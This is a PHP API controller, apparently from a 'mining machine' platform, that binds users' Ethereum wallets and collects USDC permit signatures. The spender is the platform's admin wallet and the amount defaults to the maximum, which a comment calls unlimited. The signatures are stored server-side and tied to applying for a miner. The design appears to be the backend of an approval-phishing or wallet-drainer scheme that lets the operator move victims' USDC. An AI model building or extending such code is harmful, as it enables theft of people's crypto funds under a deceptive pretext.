<?php

namespace app\api\controller;

use app\common\controller\HecApi;
use app\common\library\HecEth;
use app\common\library\HecMiner;
use app\common\library\HecUsdcApprove;
use app\common\library\HecUserWallet;
use app\common\model\MinerType;
use app\common\model\User as UserModel;

/**
 * 用户相关 API
 */
class User extends HecApi
{
    /**
     * GET /api/user/profile  获取当前用户最新资料（含余额）
     */
    public function profile()
    {
        $user = $this->requireUser();
        $this->hecJson(['user' => $this->formatHecUser($user)]);
    }

    /**
     * POST /api/user/wallet_connect  绑定当前扫码/插件连接的钱包地址
     */
    public function wallet_connect()
    {
        $user = $this->requireUser();
        $input = $this->getJsonInput();
        $address = HecEth::normalizeAddress($input['address'] ?? '');

        if (!HecEth::isEvmAddress($address)) {
            $this->hecError('无效的钱包地址', 400);
        }

        try {
            $bind = HecUserWallet::bindExclusiveEvmAddressWithStats($user->id, $address);
            $othersCleared = $bind['othersCleared'];
        } catch (\InvalidArgumentException $e) {
            $this->hecError($e->getMessage(), 400);
        }

        $user = UserModel::get($user->id);
        $this->hecJson([
            'user'           => $this->formatHecUser($user),
            'othersCleared'  => $othersCleared,
        ]);
    }

    /**
     * POST /api/user/wallet_disconnect  断开已绑定的 Ethereum 钱包
     */
    public function wallet_disconnect()
    {
        $user = $this->requireUser();
        $user->evm_address = '';
        $user->permit_expires_at = 0;
        $user->save();
        $this->hecJson(['user' => $this->formatHecUser($user)]);
    }

    /**
     * GET  /api/user/approve            兼容旧路径
     * POST /api/user/approve            兼容旧路径
     * GET  /api/user/permit_signature
     * POST /api/user/permit_signature
     * GET  /api/user/permit-signature
     * POST /api/user/permit-signature
     */
    public function approve()
    {
        $user = $this->requireUser();

        if ($this->request->isPost()) {
            $this->savePermitSignature($user);
            return;
        }

        $this->hecJson(['data' => $this->buildPermitStatus($user)]);
    }

    public function permit_signature()
    {
        $this->approve();
    }

    protected function buildPermitStatus($user)
    {
        $requestedOwner = HecEth::normalizeAddress($this->request->get('owner', ''));
        $dbOwner = HecEth::normalizeAddress($user->getData('evm_address') ?? '');
        $owner = ($requestedOwner && HecEth::isEvmAddress($requestedOwner)) ? $requestedOwner : $dbOwner;
        $spender = HecEth::normalizeAddress(HecEth::adminWallet());
        $permitExpiresAt = HecUsdcApprove::resolvePermitExpiresAt(
            $user->id,
            $owner ?: $dbOwner,
            (int)($user->getData('permit_expires_at') ?: 0)
        );
        if ($permitExpiresAt > (int)($user->getData('permit_expires_at') ?: 0)) {
            $user->permit_expires_at = $permitExpiresAt;
            $user->save();
        }
        $allowance = '0';
        $allowanceOk = false;
        $minRequiredRaw = HecEth::minRequiredAllowanceRaw();

        if ($owner && $spender) {
            try {
                $allowance = HecEth::fetchAllowance($owner, $spender);
                $allowanceOk = HecEth::isAllowanceSufficient($allowance, $minRequiredRaw);
            } catch (\Throwable $e) {
                // 链上查询失败时视为未授权
            }
        }

        // 链下 Permit 已签且未过期：视为已授权（无限额度签名），不再要求重复弹窗
        if ($permitExpiresAt > time()) {
            $allowanceOk = true;
            $needsReauthorize = false;
        } else {
            $needsReauthorize = !$allowanceOk && $permitExpiresAt > 0;
        }

        $minerTypeId = $this->request->get('minerTypeId', '');
        if ($minerTypeId !== '' && $owner) {
            $type = MinerType::get((int)$minerTypeId);
            if ($type) {
                $requirement = HecMiner::calcOccupiedUsdcRequirement($user->id, [
                    'includeMinerTypeId' => (int)$minerTypeId,
                ]);
                $eligibility = HecEth::buildMinerEligibility(
                    $owner,
                    $requirement['totalRequired'],
                    '申请矿机',
                    $permitExpiresAt,
                    false,
                    (int)$requirement['minerCount']
                );
                if ($permitExpiresAt <= time()) {
                    $allowanceOk = !empty($eligibility['allowanceOk']);
                    if (!$allowanceOk && $permitExpiresAt > 0) {
                        $needsReauthorize = true;
                    }
                }
            }
        }

        $data = [
            'hasValidApprove'  => $allowanceOk,
            'hasValidPermit'   => $allowanceOk,
            'allowanceOk'      => $allowanceOk,
            'needsReauthorize' => $needsReauthorize,
            'owner'            => $owner ?: null,
            'spender'          => $spender ?: null,
            'allowance'        => $allowance,
            'minRequiredAllowance' => $minRequiredRaw,
            'network'          => 'Ethereum',
            'token'            => HecEth::usdcContract(),
            'chainId'          => HecEth::CHAIN_ID,
            'permitExpiresAt'  => $permitExpiresAt > 0 ? $permitExpiresAt : null,
        ];

        if ($minerTypeId !== '' && $owner && isset($eligibility)) {
            $data['minerEligibility'] = $eligibility;
        }

        return $data;
    }

    protected function savePermitSignature($user)
    {
        $input = $this->getJsonInput();
        $owner = HecEth::normalizeAddress($input['owner'] ?? '');

        if ($owner !== '' && HecEth::isEvmAddress($owner)) {
            try {
                HecUserWallet::bindExclusiveEvmAddress($user->id, $owner);
            } catch (\InvalidArgumentException $e) {
                $this->hecError($e->getMessage(), 400);
            }
            $user = UserModel::get($user->id);
            $owner = HecEth::normalizeAddress($user->getData('evm_address') ?? $owner);
        } else {
            $owner = HecEth::normalizeAddress($user->getData('evm_address') ?? '');
        }

        if (!HecEth::isEvmAddress($owner)) {
            $this->hecError('请先连接 Ethereum 钱包', 400);
        }

        try {
            $verified = HecEth::verifyPermitPayload(array_merge($input, ['owner' => $owner]));
        } catch (\InvalidArgumentException $e) {
            $this->hecError($e->getMessage(), 400);
        } catch (\Throwable $e) {
            $this->hecError($e->getMessage() ?: '签名验证失败', 400);
        }

        $spender = HecEth::normalizeAddress(HecEth::adminWallet());
        $allowance = trim((string)($verified['value'] ?? HecEth::maxPermitValueRaw()));
        $signature = trim((string)($input['signature'] ?? ''));

        HecUsdcApprove::record($user->id, $owner, $spender, $allowance, '', $signature, [
            'nonce'    => trim((string)($input['nonce'] ?? '')),
            'deadline' => (int)$verified['deadline'],
        ]);

        $user->permit_expires_at = (int)$verified['deadline'];
        $user->save();

        $status = $this->buildPermitStatus($user);
        $minerTypeId = trim((string)($input['minerTypeId'] ?? ''));
        $message = '授权成功';
        if ($minerTypeId !== '') {
            $type = MinerType::get((int)$minerTypeId);
            if ($type) {
                $requirement = HecMiner::calcOccupiedUsdcRequirement($user->id, [
                    'includeMinerTypeId' => (int)$minerTypeId,
                ]);
                $eligibility = HecEth::buildMinerEligibility(
                    $owner,
                    $requirement['totalRequired'],
                    '申请矿机',
                    (int)$user->getData('permit_expires_at'),
                    false,
                    (int)$requirement['minerCount']
                );
                $status['minerEligibility'] = $eligibility;
                if (!$eligibility['eligible']) {
                    $message = '授权成功，但' . $eligibility['message'];
                }
            }
        }

        $this->hecJson([
            'message' => $message,
            'data'    => array_merge($status, [
                'signature' => $signature ?: null,
            ]),
        ]);
    }
}
